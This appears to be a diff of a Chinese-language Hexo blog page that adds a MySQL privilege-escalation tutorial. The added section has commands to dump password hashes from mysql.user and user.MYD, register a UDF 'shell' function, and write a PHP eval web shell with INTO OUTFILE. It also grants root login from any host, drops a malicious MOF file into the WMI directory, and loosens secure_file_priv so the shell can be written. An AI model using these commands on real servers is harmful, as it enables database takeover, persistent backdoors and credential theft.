@@ -5,9 +5,9 @@
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
     <meta name="keywords" content="mysql MOF UDF 反弹端口提权, god_13">
-    <meta name="description" content="MOF提权关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行
-脚本
-#">
+    <meta name="description" content="数据库提权常用的命令查询数据库路径：select @@basedir as basePath from dual;
+查询用户及密码：select * from mysql.user;
+注册函数：CREATE FUNCTION shell R">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -398,14 +398,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.2k
+                        1.7k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        5 Min
+                        7 Min
                     </div>
                     
                 
@@ -421,7 +421,39 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p>
+                <h2 id="数据库提权常用的命令"><a href="#数据库提权常用的命令" class="headerlink" title="数据库提权常用的命令"></a>数据库提权常用的命令</h2><pre><code>查询数据库路径：select @@basedir as basePath from dual;
+查询用户及密码：select * from mysql.user;
+注册函数：CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;;
+查版本：select version();
+写文件：select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;F://a.php&#39;;
+开外连：GRANT ALL PRIVILEGES ON . TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;root&#39; WITH GRANT OPTION;
+移动文件：select load_file(&#39;C:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;
+</code></pre><h2 id="查找root密码"><a href="#查找root密码" class="headerlink" title="查找root密码"></a>查找root密码</h2><p>利用mysql提权的三种方式均需要获取mysql数据库最高权限root的帐号密码。所以我们先讨论下如何获取mysql的root密码：<br>root密码密文存放在：mysql数据库存储目录/mysq/user.myd中，低权限下可以用以下命令读取</p>
+<pre><code>mysql&gt; select @@datadir;
+mysql&gt; use mysql;
+mysql&gt; create table test(c varchar(255) default null)engine=innodb default charset=utf8mb4;#不能使用utf8编码否则会显示不完整
+mysql&gt; load data local infile &#39;E:/PHPstudy/PHPTutorial/MySQL/data/mysql/user.MYD&#39; into table test fields terminated by &#39;&#39; lines terminated by &#39;\0&#39;;
+mysql&gt; select * from test;
+</code></pre><p>显示出来的是密码经过加密处理后的结果，还要自己去解密，参考<a href="https://www.jianshu.com/p/bc9e8296255f" target="_blank" rel="noopener">https://www.jianshu.com/p/bc9e8296255f</a></p>
+<h2 id="解决–secure-file-priv报错"><a href="#解决–secure-file-priv报错" class="headerlink" title="解决–secure-file-priv报错"></a>解决–secure-file-priv报错</h2><p>有时候我们导入导出数据的时候会报错</p>
+<pre><code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+</code></pre><p>这是mysql设置的权限，先使用</p>
+<pre><code>show variables like &#39;%secure%&#39;;
+</code></pre><p>查看secure-file-priv当前的值是什么，默认为NULL，现在需要在my.ini里面修改secure-file-priv的路径，想要在那个文件夹里面传文件，就把目录添加到配置文件里</p>
+<pre><code>secure_file_priv = E:/PHPstudy/PHPTutorial/MySQL/bin
+</code></pre><p>再次查看</p>
+<pre><code>mysql&gt; show variables like &#39;%secure%&#39;;
++------------------+---------------------------------------------+
+| Variable_name    | Value                                       |
++------------------+---------------------------------------------+
+| secure_auth      | OFF                                         |
+| secure_file_priv | E:\PHPstudy\PHPTutorial\MySQL\bin\ |
++------------------+---------------------------------------------+
+2 rows in set (0.00 sec)
+</code></pre><p>重启一下mysql服务，然后就可以导入文件了</p>
+<pre><code>mysql&gt; select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;E:\\PHPstudy\\PHPTutorial\\MySQL\\bin\\b.php&#39;;
+Query OK, 1 row affected (0.00 sec)
+</code></pre><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p>
 <p>脚本</p>
 <pre><code>#添加admin用户
 #pragma namespace(“\\\\.\\root\\subscription”)
@@ -758,9 +790,9 @@ about 说明与帮助函数;
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            MOF提权关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行
-脚本
-#
+                            数据库提权常用的命令查询数据库路径：select @@basedir as basePath from dual;
+查询用户及密码：select * from mysql.user;
+注册函数：CREATE FUNCTION shell R
                         
                     </div>
                     <div class="publish-info">
@@ -984,7 +1016,7 @@ about 说明与帮助函数;
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">21.8k</span>
+                <span class="white-color">22.3k</span>
             
 
             
